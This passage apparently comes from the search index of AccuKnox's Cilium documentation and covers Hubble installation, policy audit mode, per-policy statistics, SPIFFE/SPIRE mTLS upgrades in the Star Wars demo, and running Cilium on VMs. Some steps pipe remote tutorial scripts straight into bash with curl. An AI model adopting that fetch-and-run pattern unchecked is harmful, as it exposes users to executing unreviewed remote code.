https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)\ncurl -L --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-amd64.tar.gz{,.sha256sum}\nsha256sum --check hubble-linux-amd64.tar.gz.sha256sum\nsudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin\nrm hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre>"},{"location":"open-source/cilium-install/#5-getting-alertstelemetry-from-cilium","title":"5. Getting Alerts/Telemetry from Cilium","text":""},{"location":"open-source/cilium-install/#a-enable-port-forwarding-for-cilium-hubble-relay","title":"a. Enable port-forwarding for Cilium Hubble relay","text":"<pre><code>cilium hubble port-forward&amp;\n</code></pre>"},{"location":"open-source/cilium-install/#b-observing-logs-using-hubble-cli","title":"b. Observing logs using hubble cli","text":"<pre><code>hubble observe\n</code></pre>"},{"location":"open-source/cilium-policy-audit/","title":"Cilium Policy Audit","text":"<p>Policy auditing is a feature added to Cilium by Accuknox which enables users to apply network policies in the cluster in the audit mode. Audit mode helps users to understand and observe the effects of a network policy before it gets enforced. </p>"},{"location":"open-source/cilium-policy-audit/#l3l4-policy-audit","title":"L3/L4 Policy Audit","text":"<p>In L3/L4 Cilium network policy specification, users can use <code>auditMode: true</code> option in combination with <code>ingressDeny</code> or <code>egressDeny</code> clauses and apply the network policy in audit mode. When a deny policy is applied in audit mode, the network packets matching such policies will be allowed to flow through the network, but <code>cilium-monitor</code> logs will provide the following information about the flows.</p> <ul> <li><code>PolicyName</code> - Name of the policy with which the flow matches.</li> <li><code>auditMode</code> - Is it a audit mode policy (true/false)?</li> <li><code>action</code> - What happens if the policy is enforced (allow/deny)?</li> </ul> <p>Users can build tools/scripts which utilize the <code>cilium-monitor</code> logs to observe/visualize the effects of the network policies before enforcing it.</p> <p>Note: Audit mode does not have any effect when used with <code>ingress</code> or <code>egress</code> clauses in L3/L4 network policies. The behavior of such policies will be as same as a policy which does not have <code>auditMode: true</code> option.</p>"},{"location":"open-source/cilium-policy-audit/#demo","title":"Demo","text":"<p>The following steps showcases how to apply network policies in audit mode using Cilium.</p>"},{"location":"open-source/cilium-policy-audit/#1-setup","title":"1. Setup","text":"<p>Refer to our Cilium installation guide and install Cilium in your kubernetes cluster. </p>"},{"location":"open-source/cilium-policy-audit/#2-deploy-demo-application","title":"2. Deploy Demo Application","text":"<p><pre><code>kubectl create -f https://raw.githubusercontent.com/accuknox/tools/main/other/deathstar-demo/cilium-deathstar-demo-app.yaml\n</code></pre> The demo application has the following topology.</p> <p></p>"},{"location":"open-source/cilium-policy-audit/#3-apply-network-policy","title":"3. Apply Network Policy","text":""},{"location":"open-source/cilium-policy-audit/#a-allow-all","title":"a. Allow All","text":"<p>Let's apply a policy which enables any pod in the cluster to access <code>deathstar</code>'s HTTP APIs. <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"rule1\"\nspec:\ndescription: \"Allow any pod to access deathstar's HTTP server\"\nendpointSelector:\nmatchLabels:\norg: empire\nclass: deathstar\ningress:\n- toPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> To apply the above policy, execute the following command.  <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/tools/main/other/cilium-policy-audit-stats/cilium-cnp-policy-audit-rule1.yaml\n</code></pre></p>"},{"location":"open-source/cilium-policy-audit/#b-deny-xwing","title":"b. Deny xwing","text":"<p>Let's apply another policy which denies access to <code>xwing</code> pod. <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"rule2\"\nspec:\nauditMode: true\ndescription: \"Deny xwing to access deathstar\"\nendpointSelector:\nmatchLabels:\norg: empire\nclass: deathstar\ningressDeny:\n- fromEndpoints:\n- matchLabels:\nclass: xwing\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> In the usual case, this policy will be enforced. Since we have configured the above policy with <code>auditMode: true</code>, this policy will not be enforced, but it will be just audited.   </p> <p>To apply this audit mode policy, execute the following command. <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/tools/main/other/cilium-policy-audit-stats/cilium-cnp-policy-audit-rule2.yaml\n</code></pre></p>"},{"location":"open-source/cilium-policy-audit/#4-validate-the-policies","title":"4. Validate the Policies","text":""},{"location":"open-source/cilium-policy-audit/#a-identity-the-cilium-agent-pod","title":"a. Identity the Cilium Agent Pod","text":"<p>In order to validate the audit mode policy, first we have to identity the <code>cilium</code> pod which is running in the same node as the <code>deathstar</code> pod. <pre><code>$ kubectl get pods -l class=deathstar -o wide\nNAME                        READY   STATUS    RESTARTS      AGE     IP           NODE         NOMINATED NODE   READINESS GATES\ndeathstar                   1/1     Running   1 (17h ago)   2d13h   10.0.1.131   k8s-master   &lt;none&gt;           &lt;none&gt;\n\n$ kubectl -n kube-system get pods -l k8s-app=cilium -o wide\nNAME           READY   STATUS    RESTARTS      AGE   IP              NODE          NOMINATED NODE   READINESS GATES\ncilium-lrg5j   1/1     Running   1 (17h ago)   35h   10.157.68.207   k8s-worker1   &lt;none&gt;           &lt;none&gt;\ncilium-m89bs   1/1     Running   2 (17h ago)   35h   10.157.68.25    k8s-master    &lt;none&gt;           &lt;none&gt;\n</code></pre></p> <p>From the above output, we can identity that, <code>cilium-m89bs</code> is running in the same node as the <code>deathstar</code> pod.</p>"},{"location":"open-source/cilium-policy-audit/#b-run-the-cilium-monitor","title":"b. Run the Cilium Monitor","text":"<p>Run the <code>cilium-monitor</code> process inside the identity <code>cilium</code> pod. <pre><code>kubectl -n kube-system exec cilium-m89bs -- cilium monitor -t policy-verdict\n</code></pre></p>"},{"location":"open-source/cilium-policy-audit/#c-access-deathstars-apis","title":"c. Access Deathstar's APIs","text":"<p>Open another shell and execute the following command. <pre><code>$ kubectl exec tiefighter -- curl -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing\nShip landed\n$ kubectl exec xwing -- curl -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing\nShip landed\n</code></pre></p>"},{"location":"open-source/cilium-policy-audit/#d-cilium-policy-verdict","title":"d. Cilium Policy Verdict","text":"<p>Even though both the requests are successful, if you see the output of the <code>cilium-monitor</code>, you will see a similar output. <pre><code>Policy verdict log: flow 0x0, PolicyName rule1, local EP ID 262, remote ID 3884, proto 6, ingress, action ALLOW auditMode:false, match all, 10.0.0.53:55238 -&gt; 10.0.1.34:80 tcp SYN\n\nPolicy verdict log: flow 0x0, PolicyName rule2, local EP ID 262, remote ID 30448, proto 6, ingress, action DENY auditMode:true, match all, 10.0.0.54:54928 -&gt; 10.0.1.34:80 tcp SYN\n</code></pre></p> <p>The output indicates the following,</p> <ol> <li> <p><code>tiefighter --&gt; deathstar</code>: Policy verdict is <code>ALLOW</code> because of <code>rule1</code>. This is expected because in <code>rule1</code> we have configured to allow any pod to access deathstar's HTTP APIs.</p> </li> <li> <p><code>xwing --&gt; deathstar</code>: Policy verdict is <code>DENY</code> because of <code>ingressDeny</code> clause in <code>rule2</code>. But the request was allowed because the policy <code>rule2</code> is set to <code>auditMode: true</code> </p> </li> </ol> <p>Users can utilize the above information from <code>cilium-monitor</code> logs and build tools on top of that to observe and visualize the effects of <code>ingressDeny</code> or <code>egressDeny</code> policies before enforcing it. </p>"},{"location":"open-source/cilium-policy-stats/","title":"Cilium Policy Statistics","text":"<p>A challenge faced by the users of Cilium ecosystem is that Cilium network log (<code>cilium-monitor</code>) does not provide any mechanism to collect statistics about the flows that are allowed or denied based on a particular policy.  </p> <p>To solve this problem, Accuknox has added improvements to the Cilium network logs. In the patched version, <code>cilium-monitor</code> logs will provide the following information about the flows.</p> <ul> <li><code>PolicyName</code> - Name of the policy with which the flow matches.</li> <li><code>action</code> - Action taken - Allowed or Denied</li> </ul> <p>Users can build tools/scripts which utilize the <code>cilium-monitor</code> logs to collect per-policy statistics. </p>"},{"location":"open-source/cilium-policy-stats/#demo","title":"Demo","text":"<p>The following steps showcases how to collect logs from Cilium which has the above mentioned information.</p>"},{"location":"open-source/cilium-policy-stats/#1-setup","title":"1. Setup","text":"<p>Refer to our Cilium installation guide and install Cilium in your kubernetes cluster. </p>"},{"location":"open-source/cilium-policy-stats/#2-deploy-demo-application","title":"2. Deploy Demo Application","text":"<p><pre><code>kubectl create -f https://raw.githubusercontent.com/accuknox/tools/main/other/deathstar-demo/cilium-deathstar-demo-app.yaml\n</code></pre> The demo application has the following topology.</p> <p></p>"},{"location":"open-source/cilium-policy-stats/#3-apply-network-policy","title":"3. Apply Network Policy","text":"<p>Let's apply a policy which enables <code>tiefighter</code> pod to access <code>deathstar</code>'s HTTP APIs.</p> <p><pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"rule1\"\nspec:\ndescription: \"L3-L4 policy to restrict deathstar access to empire ships only\"\nendpointSelector:\nmatchLabels:\norg: empire\nclass: deathstar\ningress:\n- fromEndpoints:\n- matchLabels:\norg: empire\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP </code></pre> To apply the above policy, execute the following command.  <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/tools/main/other/cilium-policy-audit-stats/cilium-cnp-deathstar-allow-empire.yaml\n</code></pre></p>"},{"location":"open-source/cilium-policy-stats/#4-collect-logs","title":"4. Collect logs","text":""},{"location":"open-source/cilium-policy-stats/#a-identity-the-cilium-agent-pod","title":"a. Identity the Cilium Agent Pod","text":"<p>First we have to identity the <code>cilium</code> pod which is running in the same node as the <code>deathstar</code> pod. <pre><code>kubectl get pods -l class=deathstar -o wide\nNAME                        READY   STATUS    RESTARTS      AGE     IP           NODE         NOMINATED NODE   READINESS GATES\ndeathstar                   1/1     Running   1 (17h ago)   2d13h   10.0.1.131   k8s-master   &lt;none&gt;           &lt;none&gt;\n\nkubectl -n kube-system get pods -l k8s-app=cilium -o wide\nNAME           READY   STATUS    RESTARTS      AGE   IP              NODE          NOMINATED NODE   READINESS GATES\ncilium-lrg5j   1/1     Running   1 (17h ago)   35h   10.157.68.207   k8s-worker1   &lt;none&gt;           &lt;none&gt;\ncilium-m89bs   1/1     Running   2 (17h ago)   35h   10.157.68.25    k8s-master    &lt;none&gt;           &lt;none&gt;\n</code></pre></p> <p>From the above output, we can identity that <code>cilium-m89bs</code> is running in the same node as the <code>deathstar</code> pod.</p>"},{"location":"open-source/cilium-policy-stats/#b-run-the-cilium-monitor","title":"b. Run the Cilium Monitor","text":"<p>Run the <code>cilium-monitor</code> process inside the identified <code>cilium</code> pod. <pre><code>kubectl -n kube-system exec -it cilium-m89bs -- cilium monitor -t policy-verdict\n</code></pre></p>"},{"location":"open-source/cilium-policy-stats/#c-access-deathstars-apis","title":"c. Access Deathstar's APIs","text":"<p>Open another shell and execute the following command. <pre><code>kubectl exec -it tiefighter -- curl -m 5 -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing\nShip landed\nkubectl exec -it xwing -- curl -m 5 -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing\ncurl: (28) Connection timed out after 5001 milliseconds\ncommand terminated with exit code 28\n</code></pre></p>"},{"location":"open-source/cilium-policy-stats/#d-cilium-monitor-logs","title":"d. Cilium Monitor Logs","text":"<p>If you see the output of the <code>cilium-monitor</code>, you will see a similar output. <pre><code>Policy verdict log: flow 0x0, PolicyName rule1, local EP ID 262, remote ID 3884, proto 6, ingress, action ALLOW auditMode:false, match all, 10.0.0.53:55238 -&gt; 10.0.1.34:80 tcp SYN\n\nPolicy verdict log: flow 0x0, PolicyName implicit-default-deny,, local EP ID 262, remote ID 30448, proto 6, ingress, action DENY auditMode:true, match all, 10.0.0.54:54928 -&gt; 10.0.1.34:80 tcp SYN\n</code></pre></p> <p>The log indicates the following,</p> <ol> <li> <p><code>tiefighter --&gt; deathstar</code>: Policy verdict is <code>ALLOW</code> because of policy <code>rule1</code>.</p> </li> <li> <p><code>xwing --&gt; deathstar</code>: Policy verdict is <code>DENY</code> because of <code>implicit-default-deny</code>. i.e In Cilium, if a allow policy for the specific flow does not exist then the default action is <code>DENY</code>.</p> </li> </ol> <p>Users can utilize the above information from <code>cilium-monitor</code> logs and build tools on top of that to collect per-policy statistics. </p>"},{"location":"open-source/cilium-spire-spiffe/","title":"Cilium-SPIFFE/SPIRE: Integration Guide","text":""},{"location":"open-source/cilium-spire-spiffe/#why-cilium-spiffespire-integration","title":"Why CIlium-SPIFFE/SPIRE integration","text":"<p>One great way to remove the overhead of secure communication and scaling the security issue will be to use SPIRE, which provides fine-grained, dynamic workload identity management. SPIRE provides the control plane to provision SPIFFE IDs to the workloads. These SPIFFE IDs can then be used for policy authorization. It enables teams to define and test policies for workloads operating on a variety of infrastructure types, including bare metal, public cloud (such as GCP), and container platforms (like Kubernetes).  </p> <p>Note: This integration modifies the following components: cilium-agent, cilium-envoy, and spire-agent.</p> <p>The image below represents the summary of the actions performed in each of them.</p> <p></p>"},{"location":"open-source/cilium-spire-spiffe/#the-scenario-setup","title":"The Scenario Setup","text":""},{"location":"open-source/cilium-spire-spiffe/#1-create-a-cluster","title":"1. Create a cluster","text":"<ul> <li>GKE <pre><code>export  NAME=\"test-$RANDOM\"\ngcloud container clusters create \"${NAME}\" --zone us-west2-a --image-type=UBUNTU\ngcloud container clusters get-credentials \"${NAME}\" --zone us-west2-a\n</code></pre></li> <li>MiniKube <pre><code>minikube start --network-plugin=cni --memory=4096\nminikube ssh -- sudo mount bpffs -t bpf /sys/fs/bpf\n</code></pre></li> </ul> <p>Note: It is assumed that the k8s cluster is already present/reachable and the user has the rights to create service accounts and cluster-role-bindings.</p>"},{"location":"open-source/cilium-spire-spiffe/#2-deploy-manifest-cilium-control-plane-spire-control-plane-dependencies","title":"2. Deploy manifest (cilium-control-plane + spire-control-plane + dependencies).","text":"<pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/microservices-demo/main/cilium-spire/cilium-gke.yaml \\\n-f https://raw.githubusercontent.com/accuknox/microservices-demo/main/cilium-spire/spire.yaml\n</code></pre>"},{"location":"open-source/cilium-spire-spiffe/#3-check-the-status-of-all-the-pods","title":"3. Check the status of all the pods.","text":"<pre><code>kubectl get pods -A | egrep -i 'spire|cilium'\nkube-system   cilium-26c86                                           1/1     Running   0          16h\nkube-system   cilium-jdx87                                           1/1     Running   0          16h\nkube-system   cilium-node-init-2zrjf                                 1/1     Running   0          16h\nkube-system   cilium-node-init-7xdl9                                 1/1     Running   0          16h\nkube-system   cilium-node-init-lk4kz                                 1/1     Running   0          16h\nkube-system   cilium-operator-7c97784647-nk86q                       1/1     Running   0          16h\nkube-system   cilium-operator-7c97784647-xrhd2                       1/1     Running   0          16h\nkube-system   cilium-spsm8                                           1/1     Running   0          16h\nspire         spire-agent-2glk2                                      1/1     Running   0          13m\nspire         spire-agent-bs679                                      1/1     Running   0          123m\nspire         spire-agent-lv66b                                      1/1     Running   0          5h32m\nspire         spire-server-0                                         1/1     Running   0          38m\n</code></pre> <p>Note:  The spire-control plane (spire-agent and spire-server) should be running as well as the cilium-control plane.</p> <p>Congratulations! You have a fully functional Kubernetes cluster with Cilium and SPIRE. \ud83c\udf89</p>"},{"location":"open-source/cilium-spire-spiffe/#example-scenario-upgrading-non-secure-connections-to-mtls","title":"Example Scenario: Upgrading non-secure connections to mTLS","text":"<p>The goal of the scenario exposed by the image below is to upgrade the connection from HTTP to HTTPS. This tutorial uses the Star Wars scenario from Cilium, and, based on it, upgrades the connection between the pods <code>xwing</code> to <code>deathstar</code>. A Cilium Network Policy (CNP) is going to be applied to upgrade the connection. For this tutorial the following steps will be performed:</p> <ol> <li>Deploy the Star Wars scenario;</li> <li>Apply a CNP to upgrade the connection between <code>xwing</code> and <code>deathstar</code>;</li> <li>Do an HTTP test connection.</li> </ol> <p>Note: for simplicity, in this tutorial, the upgrade happens just for HTTP connection originating from <code>xwing</code>.</p> <p></p>"},{"location":"open-source/cilium-spire-spiffe/#1-create-spire-registration-entries","title":"1. Create spire registration entries:","text":"<pre><code>curl -s https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/0-create_registration_entries.sh | bash\n</code></pre>"},{"location":"open-source/cilium-spire-spiffe/#2-deploy-star-wars-scenario-from-cilium-tutorials","title":"2. Deploy Star Wars scenario (from Cilium tutorials):","text":"<pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/1-http-sw-app.yaml\n</code></pre>"},{"location":"open-source/cilium-spire-spiffe/#3-check-if-the-spiffe-id-was-assigned-in-xwing-and-deathstar-pods","title":"3. Check if the SPIFFE ID was assigned in <code>xwing</code> and <code>deathstar</code> pods.","text":"<p>The pod <code>xwing</code> must have a new label called <code>spiffe://example.org/xwing</code> and the pod <code>deathstar</code> a new label called <code>spiffe://example.org/deathstar</code>.</p> <p><pre><code>kubectl -n kube-system exec cilium-74m7n -- cilium endpoint list\nDefaulted container \"cilium-agent\" out of: cilium-agent, mount-cgroup (init), clean-cilium-state (init)                                                                                       \nENDPOINT   POLICY (ingress)   POLICY (egress)   IDENTITY   LABELS (source:key[=value])                                           IPv6       IPv4         STATUS                               \n           ENFORCEMENT        ENFORCEMENT                                                                                                                                                     \n100        Disabled           Disabled          4069       k8s:class=deathstar                                                   fd02::8e   10.0.0.176   ready                                \n                                                           k8s:io.cilium.k8s.policy.cluster=default                                                                                           \n                                                           k8s:io.cilium.k8s.policy.serviceaccount=starwars                                                                                   \n                                                           k8s:io.kubernetes.pod.namespace=default                                                                                            \n                                                           k8s:org=empire                                                                                                                     \n                                                           spiffe://example.org/deathstar                                                                                                     \n107        Disabled           Disabled          1          k8s:minikube.k8s.io/commit=0c397146a6e4f755686a1509562111cba05f46dd                           ready                                \n                                                           k8s:minikube.k8s.io/name=minikube                                                                                                  \n                                                           k8s:minikube.k8s.io/updated_at=2021_07_27T16_23_35_0700                                                                            \n                                                           k8s:minikube.k8s.io/version=v1.21.0                                                                                                \n                                                           k8s:node-role.kubernetes.io/control-plane                                                             \n                                                           k8s:node-role.kubernetes.io/master                                                                     \n                                                           reserved:host                                                                                          \n732        Disabled           Disabled          4          reserved:health                                                       fd02::85   10.0.0.178   ready   \n801        Disabled           Disabled          62228      k8s:class=xwing                                                       fd02::1c   10.0.0.115   ready   \n                                                           k8s:io.cilium.k8s.policy.cluster=default                                                              \n                                                           k8s:io.cilium.k8s.policy.serviceaccount=starwars                                                      \n                                                           k8s:io.kubernetes.pod.namespace=default                                                               \n                                                           k8s:org=alliance                                                                                       \n                                                           spiffe://example.org/xwing                                                                             \n871        Disabled           Disabled          26062      k8s:io.cilium.k8s.policy.cluster=default                                         10.0.0.72    ready   \n                                                           k8s:io.cilium.k8s.policy.serviceaccount=coredns                                                       \n                                                           k8s:io.kubernetes.pod.namespace=kube-system                                                           \n                                                           k8s:k8s-app=kube-dns                                                                                   \n3362       Disabled           Disabled          12147      k8s:app=spire-server                                                             10.0.0.140   ready   \n                                                           k8s:io.cilium.k8s.policy.cluster=default                                                              \n                                                           k8s:io.cilium.k8s.policy.serviceaccount=spire-server                                                  \n                                                           k8s:io.kubernetes.pod.namespace=spire                                                                 \n                                                           k8s:statefulset.kubernetes.io/pod-name=spire-server-0     \n</code></pre> Now, we need to enforce a policy to upgrade the connection for the egress traffic from the <code>xwing</code> pod to port 80 and downgrade the connection for the ingress traffic to port 80 in <code>deathstar</code>.</p> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\n  name: \"tls-upgrade-xwing\"\nspec:\n  endpointSelector:\n    matchLabels:\n      class: xwing\n  egress:\n  - toPorts:\n    - ports:\n      - port: \"80\"\n        protocol: \"TCP\"\n      originatingTLS:\n        spiffe:\n          peerIDs:\n            - spiffe://example.org/deathstar\n      rules:\n        http:\n        - {}\n---\napiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\n  name: \"tls-upgrade-deathstar\"\nspec:\n  endpointSelector:\n    matchLabels:\n      class: deathstar\n  ingress:\n  - toPorts:\n    - ports:\n      - port: \"80\"\n        protocol: \"TCP\"\n      terminatingTLS:\n        spiffe:\n          peerIDs:\n            - spiffe://example.org/xwing\n      rules:\n        http:\n        - {}\n---\napiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\n  name: \"enable-xwing-dns\"\nspec:\n  description: \"Enable DNS traffic for xwing\"\n  endpointSelector:\n    matchLabels:\n     org: alliance\n     class: xwing\n  egress:\n    - toPorts:\n      - ports:\n        - port: \"53\"\n          protocol: UDP \n</code></pre> <p>Note: The last policy is related to allowing the DNS traffic for swing. It will be used later for HTTP requests.</p>"},{"location":"open-source/cilium-spire-spiffe/#4-apply-cilium-network-policies-cnp","title":"4. Apply Cilium Network Policies (CNP):","text":"<pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/2-mtls-upgrade.yaml\n</code></pre>"},{"location":"open-source/cilium-spire-spiffe/#5-check-if-the-policies-were-enforced-in-the-xwing-and-deathstar-endpoints","title":"5. Check if the policies were enforced in the <code>xwing</code> and <code>deathstar</code> endpoints.","text":"<p>Just to remember, for pod <code>xwing</code> we apply a policy just for egress and for pod <code>deathstar</code>, just for ingress. Just keep it in mind when looking at the column <code>ENFORCEMENT</code>.</p> <pre><code>kubectl exec cilium-74m7n -- cilium endpoint list\nDefaulted container \"cilium-agent\" out of: cilium-agent, mount-cgroup (init), clean-cilium-state (init)                                                                                       \nENDPOINT   POLICY (ingress)   POLICY (egress)   IDENTITY   LABELS (source:key[=value])                                           IPv6       IPv4         STATUS                               \n           ENFORCEMENT        ENFORCEMENT                                                                                                                                                     \n100        Enabled            Disabled          4069       k8s:class=deathstar                                                   fd02::8e   10.0.0.176   ready                                \n                                                           k8s:io.cilium.k8s.policy.cluster=default                                                                                           \n                                                           k8s:io.cilium.k8s.policy.serviceaccount=starwars                                                                                   \n                                                           k8s:io.kubernetes.pod.namespace=default                                                                                            \n                                                           k8s:org=empire                                                                                                                     \n                                                           spiffe://example.org/deathstar                                                                                                     \n107        Disabled           Disabled          1          k8s:minikube.k8s.io/commit=0c397146a6e4f755686a1509562111cba05f46dd                           ready                                \n                                                           k8s:minikube.k8s.io/name=minikube                                                                                                  \n                                                           k8s:minikube.k8s.io/updated_at=2021_07_27T16_23_35_0700                                                                            \n                                                           k8s:minikube.k8s.io/version=v1.21.0                                                                                                \n                                                           k8s:node-role.kubernetes.io/control-plane                                                                                          \n                                                           k8s:node-role.kubernetes.io/master                                                                                                 \n                                                           reserved:host                                                                                                                      \n732        Disabled           Disabled          4          reserved:health                                                       fd02::85   10.0.0.178   ready                                \n801        Disabled           Enabled           62228      k8s:class=xwing                                                       fd02::1c   10.0.0.115   ready                                \n                                                           k8s:io.cilium.k8s.policy.cluster=default                                                                                           \n                                                           k8s:io.cilium.k8s.policy.serviceaccount=starwars                                                                                   \n                                                           k8s:io.kubernetes.pod.namespace=default                                                                                            \n                                                           k8s:org=alliance                                                                                                                   \n                                                           spiffe://example.org/xwing                                                                                                         \n871        Disabled           Disabled          26062      k8s:io.cilium.k8s.policy.cluster=default                                         10.0.0.72    ready                                \n                                                           k8s:io.cilium.k8s.policy.serviceaccount=coredns                                                       \n                                                           k8s:io.kubernetes.pod.namespace=kube-system                                                           \n                                                           k8s:k8s-app=kube-dns                                                                                   \n3362       Disabled           Disabled          12147      k8s:app=spire-server                                                             10.0.0.140   ready   \n                                                           k8s:io.cilium.k8s.policy.cluster=default                                                              \n                                                           k8s:io.cilium.k8s.policy.serviceaccount=spire-server                                                  \n                                                           k8s:io.kubernetes.pod.namespace=spire                                                                 \n                                                           k8s:statefulset.kubernetes.io/pod-name=spire-server-0  \n</code></pre>"},{"location":"open-source/cilium-spire-spiffe/#6-send-landing-request","title":"6. Send landing request.","text":"<p>The following script is going to perform an HTTP request. This connection is going to be upgraded to HTTPS. </p> <pre><code>curl -s https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/4-curl.sh | bash\n</code></pre> <p>If the execution was succeeded, the command will return <code>Ship landed</code>.</p> <p>Note: one simple way to verify the encryption traffic is the following. Without the policy applied the traffic from this lab doesn't go through cilium_host. After applying the policy, the cilium_host receives the encrypted traffic.</p>"},{"location":"open-source/cilium-spire-spiffe/#7-using-tcpdump-to-verify-the-connection","title":"7. Using TCPdump to verify the connection","text":"<ol> <li>Login in minikube <code>minikube ssh</code>;</li> <li>Inside minikube, download tcpdump <code>apt-get update &amp; apt-get install tcpdump</code>;</li> <li>Capture the traffic from the interface cilium_host <code>tcpdump -i cilium_host port 80</code>.</li> </ol>"},{"location":"open-source/cilium-spire-spiffe/#8-clean-up-the-pods-and-cnps","title":"8. Clean up the pods and CNPs:","text":"<pre><code>curl -s https://raw.githubusercontent.com/accuknox/cilium-spire-tutorials/main/scenario03/5-clean-all.sh | bash\n</code></pre>"},{"location":"open-source/cilium-spire-spiffe/#further-reading","title":"Further Reading","text":"<p>To learn more about Cilium SPIRE/SPIFFE integrations have a look at our Blogs  and GitHub. </p>"},{"location":"open-source/cilium-vm-k8s/","title":"Deploying Cilium in VMs","text":"<p>Cilium is a network policy enforcement engine that can be used both in k8s and VMs. Using Cilium with Kubernetes, one can protect both k8s workloads (pods, services) and virtual machines from network vulnerabilities. </p>"},{"location":"open-source/cilium-vm-k8s/#deployment-steps-for-cilium-vm","title":"Deployment Steps for Cilium VM","text":""},{"location":"open-source/cilium-vm-k8s/#dependencies","title":"Dependencies","text":"<p>1) A k8s cluster -  A k8s cluster (it can be a single node cluster) to act as a control plane and distribute information about identities, labels and IPs of the VMs. Users can manage network polices of the VMs using <code>kubectl</code> just like how pods or services are managed in k8s usually. </p> <p>2) Docker &gt;= 20.10 should be installed in all the VMs.</p>"},{"location":"open-source/cilium-vm-k8s/#1-download-and-install-cilium-cli","title":"1. Download and Install Cilium CLI","text":"<pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/download/v0.10.2/cilium-linux-amd64.tar.gz{,.sha256sum}\nsha256sum --check cilium-linux-amd64.tar.gz.sha256sum\nsudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\nrm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre>"},{"location":"open-source/cilium-vm-k8s/#2-setup-cilium-in-k8s-cluster","title":"2. Setup Cilium in K8s Cluster","text":"<pre><code>cilium install --config tunnel=vxlan --agent-image docker.io/accuknox/cilium:latest --operator-image docker.io/accuknox/cilium-operator-generic:latest\n</code></pre> <p>Note: If you are using AWS or Azure managed kubernetes cluster, then change the value of <code>--operator-image</code> option in the above command to <code>docker.io/accuknox/cilium-operator-aws:latest</code> or <code>docker.io/accuknox/cilium-operator-azure:latest</code> respectively.</p>"},{"location":"open-source/cilium-vm-k8s/#3-check-the-cilium-status","title":"3. Check the Cilium status","text":"<p><pre><code>cilium status\n</code></pre> There should not be any errors.</p>"},{"location":"open-source/cilium-vm-k8s/#4-enable-cilium-clustermesh","title":"4. Enable Cilium clustermesh","text":"<p>a) If you are using self-managed k8s, use the following command to enable <code>clustermesh</code>. <pre><code>cilium clustermesh enable --apiserver-image=docker.io/accuknox/cilium-clustermesh-apiserver:latest --service-type NodePort\n</code></pre> b) If you are using GKE, EKS or Azure, use the following command. <pre><code>cilium clustermesh enable --apiserver-image=docker.io/accuknox/cilium-clustermesh-apiserver:latest --service-type LoadBalancer\n</code></pre></p>"},{"location":"open-source/cilium-vm-k8s/#5-onboard-vms-in-the-cluster","title":"5. Onboard VMs in the cluster","text":"<p>a) Create an entry for each VM and assign labels to them. <pre><code>cilium clustermesh vm create &lt;vm-hostname&gt; --labels key1=value1,key2=value2..keyN=valueN\n</code></pre></p> <ul> <li><code>hostname</code> - VM's hostname</li> <li><code>key1=value1,key2=value2...keyN=valueN</code> - Labels of the VM (similar to pod labels).</li> </ul> <p>b) Repeat the above command for each VM you wish to add to the cluster.</p> <p>c) Once all the VMs are added, verify it. <pre><code>cilium clustermesh vm status\n</code></pre></p>"},{"location":"open-source/cilium-vm-k8s/#6-generate-vm-installation-script","title":"6. Generate VM installation script","text":"<p>a) Generate the shell script to install Cilium in VMs. <pre><code>cilium clustermesh vm install &lt;file-name&gt; --config devices=&lt;interfaces&gt;,enable-host-firewall,enable-hubble=true,hubble-listen-address=:4244,hubble-disable-tls=true,external-workload\n</code></pre></p> <ul> <li><code>file-name</code> - script name (example, <code>cilium-vm-XYZ-install.sh</code>)</li> <li><code>interfaces</code> - one or more, comma separated list of VM's physical interfaces (example - <code>eth0,eth1</code>).</li> </ul> <p>b) Open the generated script and edit the value of <code>CILIUM_IMAGE</code> to <code>${1:-docker.io/accuknox/cilium:latest}</code></p> <p>c) Note:     - If the host interface names of the VMs differs from one VM to another VM, then generate a script of each VM by configuring the <code>interface</code> parameter appropriately.     - If the interface name is same for all the VMs, then you could generate the script once and use it across all the VMs.</p>"},{"location":"open-source/cilium-vm-k8s/#7-install-cilium-in-the-vms","title":"7. Install Cilium in the VMs","text":"<p>a) Copy the installation script to the VMs that are added to the cluster and run the scripts in the VM's shell.</p> <p>b) Once the installation is successful in the VM, check the status by executing the following command in VM's shell. <pre><code>cilium status\n</code></pre></p>"},{"location":"open-source/cilium-vm-k8s/#8-enforcing-network-policies-in-vm","title":"8. Enforcing network policies in VM","text":"<p>Once the Cilium installation in VMs are completed, users can start to configure network policies using <code>kubectl</code>.</p> <p>A sample Cilium network policy will look similar to the following YAML. <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumClusterwideNetworkPolicy\nmetadata:\nname: \"rule1\"\nspec:\ndescription: \"L4 policy to allow traffic only at port 80/TCP\"\nnodeSelector:\nmatchLabels:\nname: vm1\ningress:\n- 